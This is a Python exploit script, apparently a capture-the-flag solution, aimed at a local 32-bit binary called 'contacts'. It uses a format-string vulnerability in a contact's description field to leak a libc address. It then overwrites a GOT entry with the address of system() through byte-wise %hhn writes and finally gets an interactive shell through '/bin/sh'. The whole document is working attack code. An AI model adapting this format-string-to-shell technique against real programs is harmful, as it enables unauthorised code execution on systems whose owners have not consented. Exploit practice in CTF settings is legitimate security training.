from pwn import *
from zio import *

target = "./contacts"
context(arch = 'i386', os = 'linux')

def get_io(target):
	ELF("./contacts")
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io


def create_contact(io, name, number, description):
	io.read_until(">>> ")
	io.write("1\n")
	io.read_until("Name: ")
	io.write(name + "\n")
	io.read_until("No: ")
	io.write(number + "\n")
	io.read_until("description: ")
	io.write(str(len(description)) + "\n");
	io.read_until("description:")
	io.write(description + "\n");

def edit_contact(io, name, edit_type, new_info):
	io.read_until(">>> ")
	io.write("3\n")
	io.read_until("change? ")
	io.write(name + "\n")
	if edit_type == 3:
		return
	io.read_until(">>> ")
	io.write(str(edit_type) + "\n")
	if edit_type == 2:
		io.read_until("Length of description: ")
		io.write(str(len(new_info) + 1) + "\n")

	io.read_until(":")
	print [c for c in new_info]
	print len(new_info)
	io.write(new_info + "\n")
	return 


def display_contact(io):
	io.read_until(">>> ")
	io.write("4\n")

	io.read_until("Description: ")
	data = io.read_until("Menu:")
	data = data[8:-5]

	allinfo = data.split(".")[:-1]
	print "allinfo:", allinfo
	index = 1
	for item in allinfo:
		print index, ":", item
		index += 1
	return data

def display_contact(io):
	io.read_until(">>> ")
	io.write("4\n")

	io.read_until("Description: ")
	data = io.read_until("Menu:")
	data = data[:-5]

	allinfo = data.strip(".").split(".")
	index = 1
	for item in allinfo:
		print index, ":", item
		index += 1
	return data

def display_contact2(io):
	io.read_until(">>> ")
	io.write("4\n")

	io.read_until("Description: ")
	data = io.read_until("Menu:")
	data = data[:-5]
	io.read_until("Exit")
	return data


def gernerate_format_string(index, length):
	data = ""
	while True:
		buff = "%%%d$p."%(index)
		if len(data + buff) > length:
			return data, index
		data += buff
		index += 1

def get_stack_addr(io):
	index = 1
	data, index = gernerate_format_string(index, 500)
	
	create_contact(io, "pxx", "111", data)
	io.gdb_hint()
	stack_buff = "a"*4 + "b"*4 + "c" * 56
	edit_contact(io, stack_buff, 3, stack_buff)
	display_contact(io)
	io.write("5\n")
	print 'index:',index

def pwn(io):
	#get_stack_addr(io)
	#return
	#io.gdb_hint()

	create_contact(io, "pxx-a", "111", "%31$p")
	data = display_contact2(io)
	print "data:", data
	libc_main_ret_offset = 0xf7594a83 - (0xf7594990 - 0x00019990)
	libc_addr = int(data, 16) - libc_main_ret_offset
	#system_run = 0x0003E6A3 + libc_addr
	system_addr = 0x0003E800 + libc_addr
	print "system_addr:", hex(system_addr)

	edit_contact(io, 'pxx-a', 2, "/bin/sh;")

	#print "system_run:", hex(system_run)
	#io.gdb_hint()

	for i in range(4):
		name = "pxx" + str(i)
		offset = 0, 8, 16, 24
		offset = i*8
		count = (system_addr>>offset)&0xff
		if count == 0:
			description = "%9$hhn"
		else:
			description = "%%%dc%%9$hhn"%(count)
		#print "description:", description
		#edit_contact(io, 'pxx', 2, description)
		create_contact(io, name, '111', description)

		new_name = name + "\x00" + 'a'*(64 - 5) + l32(0x0804b014 + i)
		edit_contact(io, name, 1, new_name)
		display_contact2(io)

	io.read_until(">>> ")
	io.write("2\n")
	io.read_until("remove? ")
	io.write("pxx-a\n")
	#return
	io.interact()

io = get_io(target)
pwn(io)